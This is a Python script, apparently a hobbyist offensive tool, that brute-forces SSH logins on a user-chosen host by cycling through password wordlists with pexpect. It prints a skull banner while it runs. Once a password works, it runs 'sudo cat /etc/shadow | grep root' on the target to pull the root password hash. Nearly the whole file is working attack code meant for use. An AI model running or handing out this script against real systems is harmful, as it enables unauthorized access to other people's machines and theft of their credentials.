#!/usr/local/bin/python3

from time import time
import pexpect
import timeout_decorator
from termcolor import colored

PROMPT = ['# ', '>> ', '> ', '\$ ', '~$ ', ':~ ', ':~$ ']
LOGO = """

                      ..:::::::::..
                  ..:::aad8888888baa:::..
              .::::d:?88888888888?::8b::::.
            .:::d8888:?88888888??a888888b:::.
          .:::d8888888a8888888aa8888888888b:::.
         ::::dP::::::::88888888888::::::::Yb::::
        ::::dP:::::::::Y888888888P:::::::::Yb::::
       ::::d8:::::::::::Y8888888P:::::::::::8b::::
      .::::88::::::::::::Y88888P::::::::::::88::::.
      :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::
      :::::::Y88888888888P::|::Y88888888888P:::::::
      ::::::::::::::::888:::|:::888::::::::::::::::
      `:::::::::::::::8888888888888b::::::::::::::'
       :::::::::::::::88888888888888::::::::::::::
        :::::::::::::d88888888888888:::::::::::::
         ::::::::::::88::88::88:::88::::::::::::
          `::::::::::88::88::88:::88::::::::::'
            `::::::::88::88::P::::88::::::::'
              `::::::88::88:::::::88::::::'
                 ``:::::::::::::::::::''
                      ``:::::::::''

"""


def send_command(child, cmd, pswd, usr):
	child.sendline(cmd)
	child.expect(' ')
	child.sendline(pswd)
	child.expect(PROMPT)
	print(child.before)

def connect(user, host, password):
	ssh_newkey = 'Are you sure you want to continue connecting'
	connStr = 'ssh ' + user + '@' + host
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
	if ret == 0:
		print('[-] Error Connecting')
		return
	if ret == 1:
		child.sendline('yes')
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
		if ret == 0:
			print('[-] Error Connecting')
			return
	child.sendline(password)
	child.expect(PROMPT, timeout=1)
	return child


def main():
	host = input('[*] Enter Host Address: ')
	user = input('[*] Enter Host Username: ')
	file_to_use = input("""
	[*] What Password File?
		1. Common Roots
		2. 10MM Passwords
		3. Default
		""")
	file_being_used = ''
	if file_to_use == '1':
		file_being_used = 'common_roots.txt'
	elif file_to_use == '2':
		file_being_used = '~/python/passwordCracking/wordlist10MM.txt'
	elif file_to_use == '3':
		file_being_used = 'passwords.txt'
	else:
		print('Please choose a file next time')
	file = open(file_being_used, 'r')
	command = 'sudo cat /etc/shadow | grep root'
	timer = time()
	print(LOGO)
	real_password = ''
	print('###################BRUTE FORCE IN PROGRESS###################', '\n')
	for password in file:
		password = password.strip('\n')
		try:
			child = connect(user, host, password)
			real_password += password
			print('[+] Password Found: ', real_password)
			break
		except:
			print(colored('[!!]Wrong Password', 'red'))	
	print('[+]Password Found: ' + real_password)
	print('[+]Time Taken: ', time()-timer)
	send_command(child, command, real_password, user)

if __name__ == '__main__':
	main()
